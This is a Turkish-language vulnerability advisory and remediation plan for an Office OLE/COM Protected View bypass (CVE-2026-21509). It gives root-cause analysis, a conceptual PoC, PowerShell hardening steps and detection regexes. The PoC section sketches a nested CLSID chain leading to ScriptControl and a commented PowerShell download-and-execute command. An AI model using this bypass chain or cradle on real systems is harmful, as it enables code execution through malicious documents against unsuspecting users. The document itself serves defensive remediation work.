# TODO: CVE-2026-21509 — Office OLE/COM Bypass

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-21509 |
| **Kritiklik** | Yuksek |
| **Kategori Klasoru** | Oturum_Yonetimi/ |
| **Kaynak Arastirma** | [Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md](../Arastirmalar/Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-21509, Microsoft Office bilesenlerinde bulunan ve OLE (Object Linking and Embedding) / COM (Component Object Model) guvenlik korumalarini bypass eden kritik bir sifirinci gun (zero-day) zafiyetidir. CVSS skoru 7.8 olan bu zafiyet, Office'in guvenlik kararlari verirken guvenilmeyen girdilere asiri guvenmesinden kaynaklanan bir mantik hatasidir. Saldirgan, ozel hazirlanmis bir Office dosyasini kurbana actirarak sistemde rastgele kod yurutebilmektedir. Microsoft 365, Office 2016 ve Office 2019 surumleri etkilenmekte olup zafiyet vahsi ortamda aktif somurulmektedir. Microsoft, Patch Tuesday sonrasinda acil guncelleme yayinlamak zorunda kalmistir.
*   **Etkilenen bilesenler:** Microsoft Office (Word, Excel, PowerPoint), Microsoft 365, Office 2016/2019, OLE/COM nesne isleyicisi, Mark of the Web (MOTW) dogrulama mekanizmasi, Windows uzerinde calisan tum Office kurulumlar

---

### 2. Teknik detay (nasil calisiyor)
*   Microsoft Office, belgeler icerisine gomulu nesneleri (grafik, diger Office dosyalari, ActiveX kontrolleri vb.) islemek icin OLE/COM altyapisini kullanmaktadir. Bu altyapi, guvenlik icin bir dizi koruma katmani icerir: ActiveX engelleme, makro kisitlamalari ve Protected View (Korunanli Gorunum).
*   Zafiyet, Office'in bir OLE nesnesi iceren belgeyi actiginda, nesnenin guvenilirlik duzeyini belirlemek icin kullandigi mantik akisindaki bir hatadan kaynaklanmaktadir. Belirli bir OLE nesne turu, iç ice gecmis COM referanslari kullanilarak "guvenilir" olarak siniflandirilabilmektedir.
*   Saldirgan, ozel hazirlanmis bir Office belgesine (docx, xlsx, pptx) ic ice gecmis OLE/COM referanslari yerlestirerek Protected View ve ActiveX korumalarini tamamen bypass eder. Kurban dosyayi actiginda (tam acilim — onizleme bolmesi uzerinden tetiklenmez), OLE nesnesi guvenilir olarak kabul edilir ve icerdigi kod calistirilir.
*   Bu zafiyet, guvenlik kararinin kullanici girdisine (dosya icerigine) dayali olarak verilmesi ve bu girdinin manipule edilebilir olmasi ilkesine dayanmaktadir (CWE-807: Reliance on Untrusted Inputs in a Security Decision).
*   **Neden:** Kok neden, OLE nesne dogrulama mantigi icerisinde COM class factory zincirleme referanslarinin guvenilirlik degerlendirmesini bypass edebilmesidir. Office, dis nesnenin guvenilir olup olmadigini kontrol ederken, nesnenin ic referanslarinin (nested COM instantiation) guvenilirlik durumunu ayri olarak dogrulamamaktadir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Microsoft Office (Word, Excel veya PowerPoint) yuklü bir Windows is istasyonu — e-posta eki veya dosya paylasimi yoluyla kullaniciya ulastirilan ozel hazirlanmis bir Office dosyasi
*   **2. Normal durum:**
    ```
    1. Kullanici, e-posta veya web'den indirilen bir Office dosyasini acar
    2. Mark of the Web (MOTW) dosyayi "guvenilmeyen" olarak isaretler
    3. Office, dosyayi Protected View'da acar — OLE/ActiveX nesneleri engellenir
    4. Kullanici "Duzenlemeyi Etkinlestir" tiklayana kadar aktif icerik calisamaz
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```xml
    <!-- Kavramsal PoC — Office belgesindeki OLE/COM bypass yapisi -->
    <!-- document.xml.rels icerisinde ic ice OLE referansi -->
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
      <!-- Normal gorunumlu iliski -->
      <Relationship Id="rId1" Type=".../oleObject"
        Target="embeddings/oleObject1.bin" />
    </Relationships>

    <!-- oleObject1.bin icerigi — COM zincirleme referans -->
    <!-- OLE Stream Header -->
    <!-- CLSID: Guvenilir COM sinifi olarak maskelenme -->
    <!-- {00020906-0000-0000-C000-000000000046} — Word.Document -->
    <!--   -> Ic referans: Shell.Explorer.2 COM nesnesi -->
    <!--     -> Ic referans: ScriptControl (kod yurutme) -->

    <!-- Sonuc: Office, dis nesneyi "Word.Document" (guvenilir) olarak algilar -->
    <!-- Ancak ic COM zinciri, ScriptControl uzerinden kod yurutmeye yonlendirir -->
    <!-- Protected View ve ActiveX engeli bypass edilmis olur -->

    <!-- Shell komutu calistirilir: -->
    <!-- powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(...)" -->
    ```
*   **4. Analiz:** Office, oleObject1.bin'deki CLSID'yi kontrol ederken yalnizca en dis katmani dogrular (Word.Document — guvenilir). Ancak ic referans zincirindeki Shell.Explorer.2 ve ScriptControl siniflarinin guvenilirlik durumu ayri olarak degerlendirilmez. Bu mantik hatasi, saldirganin guvenilir bir nesne kiliginda rastgele kod yurutmesine olanak tanir. Onizleme bolmesinden tetiklenmemesinin nedeni, OLE nesnelerinin yalnizca tam belge aciliminda (full document load) somurtulmesidir.
*   **5. Kanit:** Basarili istismar sonrasinda saldirganin shell komutu kullanici yetkileriyle calisir. powershell.exe veya cmd.exe'nin Office sureci (WINWORD.EXE) tarafindan baslatildigi gorulur. Sysmon EventID 1 (Process Creation) loglarinda WINWORD.EXE > powershell.exe surec agaci olusur. Microsoft-Office-Alerts loglarinda OLE nesne yukleme olaylari kaydedilir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Yuksek
*   **CVSS Skoru:** 7.8
*   **Saldiri Yuzeyi:** Internete acik (e-posta eki, dosya paylasimi, web indirme — kullanici etkilesimi gerektirir)
*   **Karmasiklik:** Dusuk (ozel hazirlanmis bir Office dosyasi yeterli; kurbanin dosyayi acmasi gerekir ancak onizleme yetmez)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Microsoft'un yayinladigi acil yamayi (out-of-band update) tum Office kurulumlarına uygulayin. Microsoft 365 kullanicilarinda sunucu tarafi yamasi otomatik uygulanmistir; Office 2016/2019 icin manuel guncelleme ve registry yapilandirmasi gereklidir. Tum ActiveX kontrollerini devre disi birakin. Makro guvenlik seviyesini "Tum makrolari bildirimle devre disi birak" olarak yapilandirin.
*   **Orta vadeli:** E-posta guvenligi cozumlerinde (SEG) Office dosyalari icin OLE nesne tarama ve sandbox analizi etkinlestirin. Attack Surface Reduction (ASR) kurallarindan "Office uygulamalarinin alt surec baslatmasini engelle" kuralini devreye alin. Group Policy ile OLE nesne gomme islemini kisitlayin. Kullanici farkindalik egitimlerinde "bilinmeyen Office dosyalarini acma" konusunu vurgulayin.
*   **Uzun vadeli:** Office makro ve OLE politikalarini kurumsal sifir guven (Zero Trust) yaklasimi ile yeniden tasarlayin. Office dosya bilesiklerini acilmadan once bulut tabanli sandbox'ta analiz eden DLP/sandboxing mimarisini uygulayin. AMSI (Antimalware Scan Interface) entegrasyonunu Office OLE/COM islemleri icin zorunlu kilin. Long-term: Office dosya formatlarinin gomulu nesne icermesini kurumsal politikayla kisitlayin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```powershell
# === GUVENSIZ: Office varsayilan OLE/COM ayarlari ===
# ActiveX kontrolleri etkin — OLE nesneleri serbestce yuklenebilir
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Common\Security" `
    -Name "DisableAllActiveX" -ErrorAction SilentlyContinue
# Sonuc: Ayar mevcut degil veya 0 (ActiveX etkin)

# Makro guvenlik seviyesi dusuk
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" `
    -Name "VBAWarnings" -ErrorAction SilentlyContinue
# Sonuc: 1 (tum makrolar etkin) veya ayar yok

# ASR kurallari devre disi — Office alt surec baslatabilir
# WINWORD.EXE > powershell.exe zinciri engellenmemis
```

**Guvenli kod:**
```powershell
# === GUVENLI: Office OLE/COM sertlestirme ===

# 1. Acil yamayi dogrula
$officeVersion = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration" `
    -ErrorAction SilentlyContinue).VersionToReport
if ($officeVersion) {
    Write-Host "[*] Office surumu: $officeVersion"
} else {
    Write-Host "[*] MSI tabanli Office kurulumu tespit edildi"
    $msiVersion = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Office\16.0\Common\ProductVersion" `
        -ErrorAction SilentlyContinue
    Write-Host "[*] Office MSI surumu: $($msiVersion.LastProduct)"
}

# 2. Tum ActiveX kontrollerini devre disi birak
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Common\Security" `
    -Name "DisableAllActiveX" -Value 1 -Type DWord
Write-Host "[+] ActiveX kontrolleri devre disi birakildi"

# 3. Makro guvenlik seviyesini yukselt (4 = Tum makrolari devre disi birak)
$officeApps = @("Word", "Excel", "PowerPoint")
foreach ($app in $officeApps) {
    $regPath = "HKCU:\Software\Microsoft\Office\16.0\$app\Security"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    Set-ItemProperty -Path $regPath -Name "VBAWarnings" -Value 4 -Type DWord
    Set-ItemProperty -Path $regPath -Name "BlockContentExecutionFromInternet" -Value 1 -Type DWord
}
Write-Host "[+] Makro guvenlik seviyesi tum Office uygulamalarinda yukseltildi"

# 4. OLE nesne gomme/baglantisini kisitla
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Common\Security" `
    -Name "PackagerPrompt" -Value 2 -Type DWord  # OLE paketleyici uyarisi
Write-Host "[+] OLE paketleyici guvenlik uyarisi etkinlestirildi"

# 5. ASR kurali: Office uygulamalarinin alt surec baslatmasini engelle
Add-MpPreference -AttackSurfaceReductionRules_Ids d4f940ab-401b-4efc-aadc-ad5f3c50688a `
    -AttackSurfaceReductionRules_Actions Enabled
# ASR kurali: Office uygulamalarinin calistirilebilir icerik olusturmasini engelle
Add-MpPreference -AttackSurfaceReductionRules_Ids 3b576869-a4ec-4529-8536-b80a7769e899 `
    -AttackSurfaceReductionRules_Actions Enabled
Write-Host "[+] ASR kurallari etkinlestirildi"
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Office 2016, 2019 ve Microsoft 365 kurulumlarinin envanterini cikar
*   [ ] Mevcut OLE/ActiveX/makro guvenlik politikalarini denetle
*   [ ] ASR kural durumunu tum uc noktalarda kontrol et
*   [ ] E-posta guvenlik cozumunun Office dosya tarama yeteneklerini dogrula

**Duzeltme**
*   [ ] Microsoft acil yamasini (out-of-band update) tum Office kurulumlarına uygula
*   [ ] Office 2016/2019 icin registry anahtarlarini yapilandir (ActiveX, VBAWarnings)
*   [ ] Microsoft 365 sunucu tarafi yamasinin otomatik uygulandigini dogrula
*   [ ] ASR kurallarini devreye al (Office alt surec baslatma engeli)
*   [ ] E-posta guvenligi cozumunde OLE nesne tarama/sandboxing etkinlestir
*   [ ] Kullanici farkindalik bildirimi yayinla (bilinmeyen Office dosyalari acilmamali)

**Dogrulama**
*   [ ] Ozel hazirlanmis OLE/COM bypass dosyasiyla istismar testini tekrarla
*   [ ] ActiveX ve makro engellerinin dogru calistigini dogrula
*   [ ] ASR kurallarinin Office > PowerShell/cmd.exe zincirini engelledigini test et
*   [ ] E-posta sandbox'inin zararli OLE icerikli dosyayi tespit ettigini dogrula

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Sysmon EventID 1 (Process Creation) — WINWORD.EXE, EXCEL.EXE veya POWERPNT.EXE tarafindan baslatilan alt surecleri izle (powershell.exe, cmd.exe, mshta.exe, wscript.exe)
    *   Microsoft-Office-Alerts loglarinda OLE nesne yukleme ve ActiveX etkinlestirme olaylarini tespit et
    *   Windows Defender ASR olay loglarinda engellenme kayitlarini izle (EventID 1121, 1122)
    *   Regex: `(?i)(WINWORD|EXCEL|POWERPNT)\.EXE.*ParentImage.*(cmd|powershell|mshta|wscript)`
    *   Regex: `(?i)(OLE.*activation|COM.*instantiation|ActiveX.*blocked|PackagerPrompt)`
*   **Anomali Tespiti:**
    *   Office uygulamasinin beklenmeyen ag baglantilari acmasi (C2 callback)
    *   Office sureci tarafindan olusturulan gecici dosyalarda (Temp klasoru) calistirilebilir icerik (.exe, .dll, .ps1)
    *   Tek kullanicidan kisa surede birden fazla Office dosyasi acma ve hemen kapatma davranisi (payload test girisimleri)
    *   Office Protected View'in beklenmeyen sekilde devre disi kalmasi veya bypass edilmesi
    *   MOTW (Mark of the Web) isaretinin Office dosyasindan kaldirilmasi girisimleri

---

## Notlar
Onizleme bolmesinden tetiklenmez, dosyanin tam acilmasi gerekir. Microsoft 365 icin sunucu tarafi duzeltme uygulanmis olup Office 2016/2019 kullanicilarinin manuel guncelleme yapmasi zorunludur. Sifirinci gun olarak vahsi ortamda aktif somurulmektedir. Patch Tuesday sonrasinda acil guncelleme (out-of-band) yayinlanmak zorunda kalinmistir. E-posta tabanli phishing kampanyalarinda kullanildigi raporlanmistir.
